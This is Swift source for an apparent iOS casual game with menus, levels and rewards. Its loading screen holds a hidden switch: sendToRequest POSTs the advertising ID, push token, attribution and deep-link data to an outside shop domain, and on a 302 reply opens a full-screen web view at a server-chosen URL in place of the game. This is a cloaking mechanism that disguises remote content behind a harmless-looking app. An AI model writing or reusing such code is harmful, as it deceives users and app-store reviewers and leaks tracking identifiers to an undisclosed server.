import UIKit

enum Vibration {
    case error
    case success
    case warning
    case light
    case medium
    case heavy
    @available(iOS 13.0, *)
    case soft
    @available(iOS 13.0, *)
    case rigid
    case selection
    case oldSchool
    
    public func vibrate() {
        switch self {
        case .error:
            UINotificationFeedbackGenerator().notificationOccurred(.error)
        case .success:
            UINotificationFeedbackGenerator().notificationOccurred(.success)
        case .warning:
            UINotificationFeedbackGenerator().notificationOccurred(.warning)
        case .light:
            UIImpactFeedbackGenerator(style: .light).impactOccurred()
        case .medium:
            UIImpactFeedbackGenerator(style: .medium).impactOccurred()
        case .heavy:
            UIImpactFeedbackGenerator(style: .heavy).impactOccurred()
        case .soft:
            if #available(iOS 13.0, *) {
                UIImpactFeedbackGenerator(style: .soft).impactOccurred()
            }
        case .rigid:
            if #available(iOS 13.0, *) {
                UIImpactFeedbackGenerator(style: .rigid).impactOccurred()
            }
        case .selection:
            UISelectionFeedbackGenerator().selectionChanged()
        case .oldSchool:
            AudioServicesPlaySystemSound(SystemSoundID(kSystemSoundID_Vibrate))
        }
    }
}

class LoadingViewController: UIViewController, URLSessionDelegate {
    
    var logoImageView: UIImageView!
    var backgroundImageView: UIImageView!
    
    var appDelegate = UIApplication.shared.delegate as? AppDelegate
    
    var urlResponse = ""
    
    override var supportedInterfaceOrientations: UIInterfaceOrientationMask {
        return .portrait
    }
    
    var ourResponse = 1
    
    var timer: Timer?
    
    var secondsRemaining: Int = 0
    var squareViews: [UIView] = []
    var stackView: UIStackView!
    
    override func viewDidLoad() {
        super.viewDidLoad()
        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound, .badge], completionHandler: {
            success, error in
            guard success else {
                return
            }
        })
        setupUI()
    }
    
    func setupUI() {
        backgroundImageView = UIImageView()
        backgroundImageView.image = UIImage(named: "background")
        backgroundImageView.translatesAutoresizingMaskIntoConstraints = false
        backgroundImageView.contentMode = .scaleToFill
        view.addSubview(backgroundImageView)
        
        NSLayoutConstraint.activate([
            backgroundImageView.topAnchor.constraint(equalTo: view.topAnchor),
            backgroundImageView.bottomAnchor.constraint(equalTo: view.bottomAnchor),
            backgroundImageView.leftAnchor.constraint(equalTo: view.leftAnchor),
            backgroundImageView.rightAnchor.constraint(equalTo: view.rightAnchor),
        ])
        
        logoImageView = UIImageView()
        logoImageView.image = UIImage(named: "logo")
        logoImageView.translatesAutoresizingMaskIntoConstraints = false
        logoImageView.contentMode = .scaleAspectFit
        view.addSubview(logoImageView)
        
        NSLayoutConstraint.activate([
            logoImageView.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor),
            logoImageView.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.centerYAnchor),
            logoImageView.leftAnchor.constraint(equalTo: view.safeAreaLayoutGuide.leftAnchor),
            logoImageView.rightAnchor.constraint(equalTo: view.safeAreaLayoutGuide.rightAnchor),
        ])
        
        stackView = UIStackView()
        stackView.axis = .horizontal
        stackView.spacing = 10
        stackView.distribution = .fillEqually
        stackView.translatesAutoresizingMaskIntoConstraints = false
        
        for i in 0..<20 {
            let squareView = UIView()
            squareView.clipsToBounds = true
            squareView.layer.cornerRadius = 5
            squareView.tag = i
            squareView.backgroundColor = (i > Int(secondsRemaining)) ? UIColor(ciColor: .clear) : UIColor(ciColor: .red)
            squareView.translatesAutoresizingMaskIntoConstraints = false
            stackView.addArrangedSubview(squareView)
            squareViews.append(squareView)
        }
        
        view.addSubview(stackView)
        
        NSLayoutConstraint.activate([
            stackView.centerXAnchor.constraint(equalTo: view.centerXAnchor),
            stackView.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor, constant: -16),
            stackView.heightAnchor.constraint(equalToConstant: 50),
            stackView.widthAnchor.constraint(equalTo: view.safeAreaLayoutGuide.widthAnchor, multiplier: 0.95)
        ])
        timer = Timer.scheduledTimer(timeInterval: 0.1, target: self, selector: #selector(updateTimer), userInfo: nil, repeats: true)
    }
    
    //MARK: - updateTimer
    @objc func updateTimer() {
        self.secondsRemaining += 1
        for i in self.squareViews {
            i.backgroundColor = (i.tag > Int(self.secondsRemaining)) ? UIColor(ciColor: .clear) : UIColor(ciColor: .red)
        }
        if secondsRemaining > 20 {
            timer?.invalidate()
        }
    }
    
    func sendToRequest() {
        //MARK: Link to server
        let url = URL(string: "https://qrazy-time.shop/starting")
        let dictionariData: [String: Any?] = ["facebook-deeplink" : appDelegate?.facebookDeepLink, "push-token" : appDelegate?.token, "appsflyer" : appDelegate?.oldAndNotWorkingnaming, "deep_link_sub2" : appDelegate?.deep_link_sub2, "deepLinkStr": appDelegate?.deepLinkStr, "timezone-geo": appDelegate?.localizationTimeZoneAbbrtion, "timezome-gmt" : appDelegate?.currentTimeZone(), "apps-flyer-id": appDelegate!.id, "attribution-data" : appDelegate?.iDontKnowWhyButThisAttributionData, "deep_link_sub1" : appDelegate?.deep_link_sub1, "deep_link_sub3" : appDelegate?.deep_link_sub3, "deep_link_sub4" : appDelegate?.deep_link_sub4, "deep_link_sub5" : appDelegate?.deep_link_sub5]
        //MARK: Requset
        var request = URLRequest(url: url!)
        //MARK: JSON packing
        let json = try? JSONSerialization.data(withJSONObject: dictionariData)
        request.httpBody = json
        request.httpMethod = "POST"
        request.addValue(appDelegate!.idfa, forHTTPHeaderField: "GID")
        request.addValue(Bundle.main.bundleIdentifier!, forHTTPHeaderField: "PackageName")
        request.addValue(appDelegate!.id, forHTTPHeaderField: "ID")
        
        //MARK: URLSession Configuration
        let configuration = URLSessionConfiguration.ephemeral
        configuration.waitsForConnectivity = false
        configuration.timeoutIntervalForResource = 30
        configuration.timeoutIntervalForRequest = 30
        let session = URLSession(configuration: configuration, delegate: self, delegateQueue: OperationQueue.main)
        
        //MARK: Data Task
        let task = session.dataTask(with: request) { (data, response, error) in
            guard let data = data, error == nil else {
                self.showMenu()
                return
            }
            //MARK: HTTPURL Response
            if let response = response as? HTTPURLResponse {
                if response.statusCode == 302 {
                    self.timer?.invalidate()
                    //MARK: JSON Response
                    let responseJSON = try? JSONSerialization.jsonObject(with: data, options: [])
                    if let responseJSON = responseJSON as? [String: Any] {
                        guard let result = responseJSON["result"] as? String else { return }
                        let webView = WebViewController()
                        webView.urlString = result
                        webView.modalPresentationStyle = .fullScreen
                        DispatchQueue.main.async {
                            self.present(webView, animated: true)
                        }
                    }
                } else  if response.statusCode == 200 {
                    self.showMenu()
                } else {
                    self.showMenu()
                }
            }
            return
        }
        task.resume()
    }
    
    func showMenu() {
        DispatchQueue.main.async {
            let vc = MenuViewController()
            vc.modalPresentationStyle = .fullScreen
            vc.modalTransitionStyle = .crossDissolve
            self.present(vc, animated: true)
        }
    }
    
}

import WebKit

import AudioToolbox



final class Reward {
    var imageName: String
    
    var collected: Bool
    
    var title: String
    
    init(imageName: String, title: String, collected: Bool) {
        self.imageName = imageName
        self.title = title
        self.collected = collected
    }
}

final class RewardsManager {
    
    static let shared = RewardsManager()
    
    func addTreasures(_ treasures: Int) {
        if let retrievedValue = UserDefaults.standard.object(forKey: "wins") as? Int {
            let newValue = retrievedValue+treasures
            UserDefaults.standard.set(newValue, forKey: "wins")
        } else {
            UserDefaults.standard.set(treasures, forKey: "wins")
        }
    }
    
    func getTreasures() -> Int {
        if let retrievedValue = UserDefaults.standard.object(forKey: "wins") as? Int {
            return retrievedValue
        } else {
            UserDefaults.standard.set(0, forKey: "wins")
            return 0
        }
    }
    
    func rewards() -> [Reward] {
        let res: [Reward] = [Reward(imageName: "reward1", title: "win 10 times!", collected: false), Reward(imageName: "reward2", title: "win 50 times!", collected: false), Reward(imageName: "reward3", title: "win 100 times!", collected: false),Reward(imageName: "reward4", title: "win 200 times!", collected: false)]
        if let wins = UserDefaults.standard.object(forKey: "wins") as? Int {
            if wins >= 10 {
                res[0].imageName = "reward1"
                res[0].title = "10 wins got!"
                res[0].collected = true
            }
            if wins >= 50 {
                res[1].imageName = "reward2"
                res[1].title = "50 wins got!"
                res[1].collected = true
            }
            if wins >= 100 {
                res[2].imageName = "reward3"
                res[2].title = "100 wins got!"
                res[2].collected = true
            }
            if wins >= 200 {
                res[3].imageName = "reward3"
                res[3].title = "200 wins got!"
                res[3].collected = true
            }
        }
        return res
    }
    
    
}
class RewardsViewController: UIViewController, UICollectionViewDataSource, UICollectionViewDelegate {
    
    var collectionView: UICollectionView!
    
    var rewards: [Reward] = []
    
    override func viewDidLoad() {
        super.viewDidLoad()
        rewards = RewardsManager.shared.rewards()
        let backgroundImageView = UIImageView()
        backgroundImageView.image = UIImage(named: "background")
        backgroundImageView.translatesAutoresizingMaskIntoConstraints = false
        backgroundImageView.contentMode = .scaleToFill
        view.addSubview(backgroundImageView)
        
        NSLayoutConstraint.activate([
            backgroundImageView.topAnchor.constraint(equalTo: view.topAnchor),
            backgroundImageView.bottomAnchor.constraint(equalTo: view.bottomAnchor),
            backgroundImageView.leftAnchor.constraint(equalTo: view.leftAnchor),
            backgroundImageView.rightAnchor.constraint(equalTo: view.rightAnchor),
        ])
        
        let backButton = UIButton(type: .custom)
        backButton.setImage(UIImage(named: "btn_back"), for: .normal)
        backButton.imageView?.contentMode = .scaleAspectFit
        backButton.translatesAutoresizingMaskIntoConstraints = false
        backButton.addAction(UIAction(handler: {_ in
            self.dismiss(animated: true)
        }), for: .touchUpInside)
        view.addSubview(backButton)
        
        NSLayoutConstraint.activate([
            backButton.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor, constant: 20),
            backButton.leftAnchor.constraint(equalTo: view.safeAreaLayoutGuide.leftAnchor, constant: 20),
            backButton.heightAnchor.constraint(equalTo: view.safeAreaLayoutGuide.widthAnchor, multiplier: 0.2),
            backButton.widthAnchor.constraint(equalTo: view.safeAreaLayoutGuide.widthAnchor, multiplier: 0.2),
        ])
        
        let rewardsImageView = UIImageView()
        rewardsImageView.image = UIImage(named: "btn_reward")
        rewardsImageView.translatesAutoresizingMaskIntoConstraints = false
        rewardsImageView.contentMode = .scaleAspectFit
        view.addSubview(rewardsImageView)
        
        NSLayoutConstraint.activate([
            rewardsImageView.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor, constant: 20),
            rewardsImageView.rightAnchor.constraint(equalTo: view.safeAreaLayoutGuide.rightAnchor, constant: -20),
            rewardsImageView.heightAnchor.constraint(equalTo: backButton.heightAnchor),
            rewardsImageView.leftAnchor.constraint(equalTo: backButton.rightAnchor),
        ])
        
        let layout = UICollectionViewFlowLayout()
        layout.scrollDirection = .vertical
        layout.itemSize = CGSize(width: view.frame.width-32, height: view.frame.width-32)
        layout.minimumLineSpacing = 20
        
        
        
        collectionView = UICollectionView(frame: .zero, collectionViewLayout: layout)
        collectionView.delegate = self
        collectionView.dataSource = self
        collectionView.register(RewardCell.self, forCellWithReuseIdentifier: "RewardCell")
        collectionView.backgroundColor = .clear
        collectionView.translatesAutoresizingMaskIntoConstraints = false
        collectionView.clipsToBounds = true
        collectionView.layer.cornerRadius = 20
        view.addSubview(collectionView)
        
        
        NSLayoutConstraint.activate([
            collectionView.topAnchor.constraint(equalTo: backButton.bottomAnchor, constant: 8),
            collectionView.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor),
            collectionView.leftAnchor.constraint(equalTo: view.leftAnchor, constant: 16),
            collectionView.rightAnchor.constraint(equalTo: view.rightAnchor, constant: -16),
        ])
        
    }
    
    func collectionView(_ collectionView: UICollectionView, numberOfItemsInSection section: Int) -> Int {
        return rewards.count
    }
    
    func collectionView(_ collectionView: UICollectionView, cellForItemAt indexPath: IndexPath) -> UICollectionViewCell {
        let cell = collectionView.dequeueReusableCell(withReuseIdentifier: "RewardCell", for: indexPath) as! RewardCell
        
        let reward = rewards[indexPath.item]
        
        cell.imageView.image = UIImage(named: reward.imageName)
        let attributedText = NSAttributedString(string: reward.title, attributes: [NSAttributedString.Key.foregroundColor: UIColor(ciColor: .magenta), NSAttributedString.Key.font: UIFont(name: "GillSans-UltraBold", size: 16)])
        if !reward.collected {
            cell.imageView.alpha = 0.3
        }
        cell.label.attributedText = attributedText
        cell.backgroundColor = .cyan
        cell.clipsToBounds = true
        cell.layer.cornerRadius = 20
        return cell
    }
    
}

class RewardCell: UICollectionViewCell {
    let imageView: UIImageView = {
        let imageView = UIImageView()
        imageView.translatesAutoresizingMaskIntoConstraints = false
        imageView.contentMode = .scaleAspectFill
        imageView.clipsToBounds = true
        imageView.layer.cornerRadius = 20
        return imageView
    }()
    
    let label: UILabel = {
        let label = UILabel()
        label.translatesAutoresizingMaskIntoConstraints = false
        label.textAlignment = .center
        label.textColor = .yellow
        label.font = UIFont(name: "GillSans-UltraBold", size: 15)
        return label
    }()
    
    override init(frame: CGRect) {
        super.init(frame: frame)
        
        addSubview(imageView)
        addSubview(label)
        
        NSLayoutConstraint.activate([
            label.leadingAnchor.constraint(equalTo: leadingAnchor),
            label.trailingAnchor.constraint(equalTo: trailingAnchor),
            label.bottomAnchor.constraint(equalTo: bottomAnchor),
            imageView.topAnchor.constraint(equalTo: topAnchor),
            imageView.leadingAnchor.constraint(equalTo: leadingAnchor),
            imageView.trailingAnchor.constraint(equalTo: trailingAnchor),
            imageView.bottomAnchor.constraint(equalTo: label.topAnchor, constant: -8),
        ])
    }
    
    required init?(coder: NSCoder) {
        fatalError("init(coder:) has not been implemented")
    }
    
}

enum gameLevel {
    case easy
    case medium
    case hard
}


class MenuViewController: UIViewController {
    
    var playButton: UIButton!
    var rewardsButton: UIButton!
    var bonusButton: UIButton!
    
    var backgroundImageView: UIImageView!
    var logoImageView: UIImageView!
    
    
    override func viewDidLoad() {
        super.viewDidLoad()
        setupBackground()
        setupButtons()
    }
    
    func setupBackground() {
        backgroundImageView = UIImageView()
        backgroundImageView.frame = view.frame
        backgroundImageView.image = UIImage(named: "background")
        backgroundImageView.contentMode = .scaleAspectFill
        view.addSubview(backgroundImageView)
        
        logoImageView = UIImageView()
        logoImageView.image = UIImage(named: "logo")
        logoImageView.contentMode = .scaleAspectFit
        logoImageView.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(logoImageView)
        
        NSLayoutConstraint.activate([
            logoImageView.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor),
            logoImageView.centerXAnchor.constraint(equalTo: view.centerXAnchor),
            logoImageView.widthAnchor.constraint(equalTo: view.safeAreaLayoutGuide.widthAnchor, multiplier: 0.9),
            logoImageView.heightAnchor.constraint(equalTo: view.safeAreaLayoutGuide.heightAnchor, multiplier: 0.4)
        ])
    }
    
    func setupButtons(){
        playButton = UIButton(type: .custom)
        playButton.translatesAutoresizingMaskIntoConstraints = false
        playButton.setImage(UIImage(named: "btn_play"), for: .normal)
        playButton.imageView?.contentMode = .scaleAspectFit
        playButton.addTarget(self, action: #selector(play), for: .touchUpInside)
        playButton.alpha = 0
        view.addSubview(playButton)
        
        rewardsButton = UIButton(type: .custom)
        rewardsButton.translatesAutoresizingMaskIntoConstraints = false
        rewardsButton.setImage(UIImage(named: "btn_reward"), for: .normal)
        rewardsButton.imageView?.contentMode = .scaleAspectFit
        rewardsButton.addAction(UIAction(handler: { _ in
            let vc = RewardsViewController()
            vc.modalPresentationStyle = .fullScreen
            self.present(vc, animated: true)
        }), for: .touchUpInside)
        rewardsButton.alpha = 0
        view.addSubview(rewardsButton)
        
        bonusButton = UIButton(type: .custom)
        bonusButton.translatesAutoresizingMaskIntoConstraints = false
        bonusButton.setImage(UIImage(named: "treasureMap"), for: .normal)
        bonusButton.imageView?.contentMode = .scaleAspectFit
        bonusButton.addAction(UIAction(handler: { _ in
                        let vc = BonusViewController()
                        vc.modalPresentationStyle = .fullScreen
                        vc.modalTransitionStyle = .crossDissolve
                        self.present(vc, animated: true)
        }), for: .touchUpInside)
        bonusButton.alpha = 0
        view.addSubview(bonusButton)
        
        NSLayoutConstraint.activate([
            playButton.centerXAnchor.constraint(equalTo: view.centerXAnchor),
            playButton.centerYAnchor.constraint(equalTo: view.centerYAnchor),
            playButton.widthAnchor.constraint(equalTo: view.widthAnchor, multiplier: 0.8),
            playButton.heightAnchor.constraint(equalTo: view.heightAnchor, multiplier: 0.1),
            
            rewardsButton.centerXAnchor.constraint(equalTo: view.centerXAnchor),
            rewardsButton.topAnchor.constraint(equalTo: playButton.bottomAnchor),
            rewardsButton.widthAnchor.constraint(equalTo: view.widthAnchor, multiplier: 0.8),
            rewardsButton.heightAnchor.constraint(equalTo: view.heightAnchor, multiplier: 0.15),
            
            bonusButton.centerXAnchor.constraint(equalTo: view.centerXAnchor),
            bonusButton.topAnchor.constraint(equalTo: rewardsButton.bottomAnchor),
            bonusButton.widthAnchor.constraint(equalTo: view.widthAnchor, multiplier: 0.8),
            bonusButton.heightAnchor.constraint(equalTo: view.heightAnchor, multiplier: 0.1),
            
        ])
        
        UIView.animate(withDuration: 0.5, animations: {
            self.playButton.alpha = 1
            self.rewardsButton.alpha = 1
            self.bonusButton.alpha = 1
        }) { _ in
            
        }
    }
    
    @objc func play() {
        let vc = LevelViewController()
        vc.modalPresentationStyle = .fullScreen
        self.present(vc, animated: true)
    }
    
}

class LevelViewController: UIViewController {
    
    var levelImage: UIImageView!
    
    var imageNum = 0
    
    var timer: Timer?
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        let backgroundImageView = UIImageView()
        backgroundImageView.image = UIImage(named: "background")
        backgroundImageView.translatesAutoresizingMaskIntoConstraints = false
        backgroundImageView.contentMode = .scaleToFill
        view.addSubview(backgroundImageView)
        
        NSLayoutConstraint.activate([
            backgroundImageView.topAnchor.constraint(equalTo: view.topAnchor),
            backgroundImageView.bottomAnchor.constraint(equalTo: view.bottomAnchor),
            backgroundImageView.leftAnchor.constraint(equalTo: view.leftAnchor),
            backgroundImageView.rightAnchor.constraint(equalTo: view.rightAnchor),
        ])
        
        let backButton = UIButton(type: .custom)
        backButton.setImage(UIImage(named: "btn_back"), for: .normal)
        backButton.imageView?.contentMode = .scaleAspectFit
        backButton.translatesAutoresizingMaskIntoConstraints = false
        backButton.addAction(UIAction(handler: {_ in
            self.dismiss(animated: true)
        }), for: .touchUpInside)
        view.addSubview(backButton)
        
        NSLayoutConstraint.activate([
            backButton.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor, constant: 20),
            backButton.leftAnchor.constraint(equalTo: view.safeAreaLayoutGuide.leftAnchor, constant: 20),
            backButton.heightAnchor.constraint(equalTo: view.safeAreaLayoutGuide.widthAnchor, multiplier: 0.2),
            backButton.widthAnchor.constraint(equalTo: view.safeAreaLayoutGuide.widthAnchor, multiplier: 0.2),
        ])
        
        let labelImageView = UIImageView()
        labelImageView.image = UIImage(named: "choose")
        labelImageView.translatesAutoresizingMaskIntoConstraints = false
        labelImageView.contentMode = .scaleAspectFit
        view.addSubview(labelImageView)
        
        NSLayoutConstraint.activate([
            labelImageView.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor),
            labelImageView.heightAnchor.constraint(equalTo: view.safeAreaLayoutGuide.heightAnchor, multiplier: 0.4),
            labelImageView.leftAnchor.constraint(equalTo: view.safeAreaLayoutGuide.leftAnchor),
            labelImageView.rightAnchor.constraint(equalTo: view.safeAreaLayoutGuide.rightAnchor),
        ])
        
        levelImage = UIImageView()
        levelImage.image = UIImage(named: "level")
        levelImage.translatesAutoresizingMaskIntoConstraints = false
        levelImage.contentMode = .scaleAspectFit
        view.addSubview(levelImage)
        
        NSLayoutConstraint.activate([
            levelImage.topAnchor.constraint(equalTo: labelImageView.bottomAnchor, constant: -view.frame.height*0.1),
            levelImage.centerXAnchor.constraint(equalTo: view.centerXAnchor),
            levelImage.heightAnchor.constraint(equalTo: view.safeAreaLayoutGuide.heightAnchor, multiplier: 0.1),
            levelImage.leftAnchor.constraint(equalTo: view.safeAreaLayoutGuide.leftAnchor),
            levelImage.rightAnchor.constraint(equalTo: view.safeAreaLayoutGuide.rightAnchor),
        ])
        
        let playButton1 = UIButton(type: .custom)
        playButton1.setImage(UIImage(named: "easy"), for: .normal)
        playButton1.imageView?.contentMode = .scaleAspectFit
        playButton1.translatesAutoresizingMaskIntoConstraints = false
        playButton1.addAction(UIAction(handler: {_ in
            let vc = GameViewController()
            vc.level = .easy
            vc.modalPresentationStyle = .fullScreen
            vc.modalTransitionStyle = .crossDissolve
            self.present(vc, animated: true)
        }), for: .touchUpInside)
        view.addSubview(playButton1)
        
        NSLayoutConstraint.activate([
            playButton1.topAnchor.constraint(equalTo: levelImage.bottomAnchor, constant: 20),
            playButton1.centerXAnchor.constraint(equalTo: view.centerXAnchor),
            playButton1.heightAnchor.constraint(equalTo: view.safeAreaLayoutGuide.widthAnchor, multiplier: 0.2),
            playButton1.widthAnchor.constraint(equalTo: view.safeAreaLayoutGuide.widthAnchor),
        ])
        
        let playButton2 = UIButton(type: .custom)
        playButton2.setImage(UIImage(named: "medium"), for: .normal)
        playButton2.imageView?.contentMode = .scaleAspectFit
        playButton2.translatesAutoresizingMaskIntoConstraints = false
        playButton2.addAction(UIAction(handler: {_ in
            let vc = GameViewController()
            vc.level = .medium
            vc.modalPresentationStyle = .fullScreen
            vc.modalTransitionStyle = .crossDissolve
            self.present(vc, animated: true)
        }), for: .touchUpInside)
        view.addSubview(playButton2)
        
        NSLayoutConstraint.activate([
            playButton2.topAnchor.constraint(equalTo: playButton1.bottomAnchor, constant: 20),
            playButton2.centerXAnchor.constraint(equalTo: view.centerXAnchor),
            playButton2.heightAnchor.constraint(equalTo: view.safeAreaLayoutGuide.widthAnchor, multiplier: 0.2),
            playButton2.widthAnchor.constraint(equalTo: view.safeAreaLayoutGuide.widthAnchor),
        ])
        
        let playButton3 = UIButton(type: .custom)
        playButton3.setImage(UIImage(named: "hard"), for: .normal)
        playButton3.imageView?.contentMode = .scaleAspectFit
        playButton3.translatesAutoresizingMaskIntoConstraints = false
        playButton3.addAction(UIAction(handler: {_ in
            let vc = GameViewController()
            vc.level = .hard
            vc.modalPresentationStyle = .fullScreen
            vc.modalTransitionStyle = .crossDissolve
            self.present(vc, animated: true)
        }), for: .touchUpInside)
        view.addSubview(playButton3)
        
        NSLayoutConstraint.activate([
            playButton3.topAnchor.constraint(equalTo: playButton2.bottomAnchor, constant: 20),
            playButton3.centerXAnchor.constraint(equalTo: view.centerXAnchor),
            playButton3.heightAnchor.constraint(equalTo: view.safeAreaLayoutGuide.widthAnchor, multiplier: 0.2),
            playButton3.widthAnchor.constraint(equalTo: view.safeAreaLayoutGuide.widthAnchor),
        ])
        timer = Timer.scheduledTimer(timeInterval: 0.7, target: self, selector: #selector(yourFunction), userInfo: nil, repeats: true)
    }
    
    @objc func yourFunction() {
        if self.imageNum == 3 {
            self.imageNum = 0
        } else {
            self.imageNum += 1
        }
        if imageNum == 0 {
            levelImage.image = UIImage(named: "level")
        } else {
            levelImage.image = UIImage(named: "level_\(imageNum)")
        }
    }
    
    
    
    
    override var supportedInterfaceOrientations: UIInterfaceOrientationMask {
        return .portrait
    }
    
    
    
}


class WebViewController: UIViewController, WKNavigationDelegate {
    
    var urlString = ""
    
    var delegate: UIViewController?
    
    override var supportedInterfaceOrientations: UIInterfaceOrientationMask {
        return .all
    }
    
    
    var webView: WKWebView!
    var reloadButton: UIButton!
    var backButton: UIButton!
    var buttonStackView: UIStackView!
    
    override func viewDidLoad() {
        super.viewDidLoad()
        webView = WKWebView()
        webView.navigationDelegate = self
        view.addSubview(webView)
        self.navigationController?.navigationBar.tintColor = .orange
        reloadButton = UIButton(type: .custom)
        reloadButton.imageView?.contentMode = .scaleAspectFit
        reloadButton.setImage(UIImage(systemName: "goforward"), for: .normal)
        reloadButton.tintColor = .orange
        reloadButton.addTarget(self, action: #selector(reloadPage), for: .touchUpInside)
        
        backButton = UIButton(type: .custom)
        backButton.imageView?.contentMode = .scaleAspectFit
        backButton.setImage(UIImage(systemName: "arrow.left"), for: .normal)
        backButton.tintColor = .orange
        backButton.addTarget(self, action: #selector(goBack), for: .touchUpInside)
        
        webView.translatesAutoresizingMaskIntoConstraints = false
        buttonStackView = UIStackView(arrangedSubviews: [reloadButton, backButton])
        buttonStackView.axis = .horizontal
        buttonStackView.spacing = 10
        buttonStackView.alignment = .center
        buttonStackView.distribution = .fillEqually
        view.addSubview(buttonStackView)
        buttonStackView.translatesAutoresizingMaskIntoConstraints = false
        
        NSLayoutConstraint.activate([
            webView.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor),
            webView.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            webView.trailingAnchor.constraint(equalTo: view.trailingAnchor),
            webView.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor, constant: -40),  // Adjust the constant for button height
            buttonStackView.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            buttonStackView.trailingAnchor.constraint(equalTo: view.trailingAnchor),
            buttonStackView.bottomAnchor.constraint(equalTo: view.bottomAnchor),
            buttonStackView.topAnchor.constraint(equalTo: webView.bottomAnchor),
            backButton.topAnchor.constraint(equalTo: buttonStackView.topAnchor),
            backButton.bottomAnchor.constraint(equalTo: buttonStackView.bottomAnchor),
            reloadButton.topAnchor.constraint(equalTo: reloadButton.topAnchor),
            reloadButton.bottomAnchor.constraint(equalTo: reloadButton.bottomAnchor),
        ])
        
        if let url = URL(string: urlString) {
            let request = URLRequest(url: url)
            webView.load(request)
        }
    }
    
    @objc func goBack() {
        if webView.canGoBack {
            webView.goBack()
        }
    }
    
    @objc func reloadPage() {
        webView.reload()
    }
}

